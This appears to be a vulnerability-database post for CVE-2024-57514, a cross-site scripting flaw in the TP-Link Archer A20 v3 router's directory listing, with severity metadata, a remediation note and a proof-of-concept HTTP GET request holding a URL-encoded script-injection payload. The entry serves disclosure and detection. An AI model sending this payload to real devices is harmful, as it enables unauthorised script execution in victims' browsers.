---
layout: post
cve_id: CVE-2024-57514
title: TP-Link Archer A20 v3 Router - Cross-site Scripting
pcap: true
pcap_path: /pcaps/2024/CVE-2024-57514.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-57514.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: medium
impact: 'Authenticated attackers can inject malicious JavaScript into directory listing
  pages, executing arbitrary code in victim browsers when they visit crafted URLs.

  '
remediation: 'Update TP-Link Archer A20 v3 router to firmware version later than 1.0.6
  Build 20231011 that addresses the XSS vulnerability.

  '
reference:
- https://www.zyenra.com/blog/xss-in-tplink-archer-a20.html
- https://nvd.nist.gov/vuln/detail/CVE-2024-57514
classification:
  cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 4.8
  cve-id: CVE-2024-57514
  cwe-id: CWE-79
  epss-score: 0.13596
  epss-percentile: 0.9401
metadata:
  max-request: 1
  vendor: tp-link
  product: tp-link-archer-a20-v3-router
tags:
- cve
- cve2024
- tplink
- router
- xss
- vuln
---

## üîç Vulnerability Description
The TP-Link Archer A20 v3 router is vulnerable to Cross-site Scripting (XSS) due to improper handling of directory listing paths in the web interface. When a specially crafted URL is visited, the router's web page renders the directory listing and executes arbitrary JavaScript embedded in the URL. This allows the attacker to inject malicious code into the page, executing JavaScript on the victim's browser, which could then be used for further malicious actions. The vulnerability was identified in the 1.0.6 Build 20231011 rel.85717(5553) version.


## üåê HTTP Request
```nohighlight
GET /%3Cstyle%20onload=alert%60document.domain%60;%3E../../ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

